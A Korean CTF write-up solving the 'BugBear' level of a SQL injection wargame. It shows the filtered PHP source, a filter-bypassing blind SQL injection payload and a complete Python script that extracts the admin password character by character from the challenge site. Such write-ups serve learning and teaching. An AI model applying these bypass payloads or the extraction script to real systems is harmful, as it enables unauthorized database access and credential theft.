# BugBear

소스코드는 다음과 같다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

어김없이 `admin`계정의 `pw`를 구해야한다. 아무리봐도 `Blind SQLI`인 것 같다.

URL을 이용해 `pw`의 길이를 구해보니

> ?pw=1&no=1%7C%7Cnot%28length%28pw%29&lt;&gt;hex\(8\)\)%23 다음과 같은 URL이 나오고, 길이는 8이 된다.

이를 이용해 스크립트를 작성해 `exploit`을 해보자

```python
import sys
import urllib
import requests


def get_ascii(param, idx):
    # ?pw=1&no=1||id%20like%20char(0x61,%200x64,%200x6d,%200x69,%200x6e)%20and%20not(length(pw)<>8)
    param = urllib.parse.quote(f'{param}')
    url = f"https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=1||"
    while(True):
        idx += 1
        data = f'{url}id%0ain%0a(%22admin%22)%26%26not({param}<>hex({str(idx)}))%23'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
                , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'}
        cookie = {'PHPSESSID' : 'l9g226ba80aorqek0gqubmcqn2'}
        res = requests.get(data, headers=headers, cookies = cookie)
        if '<hr><br><h2>Hello admin</h2>' in res.text:
            return idx




def get_length(query):
    return get_ascii("length(%s)" % query, 0)

def get_content(query):
    content_len = get_length(query)

    content = ''
    # print(content_len)
    if content_len == 0:
        print('Invalid input')
        return ''
    if content_len == "error":
        print("Error")
        return "error"
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('hex(right(left(%s,%d),1))' % (query, idx), 30))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



content = get_content('pw')
```

이렇게 `pw`를 얻어 Clear!

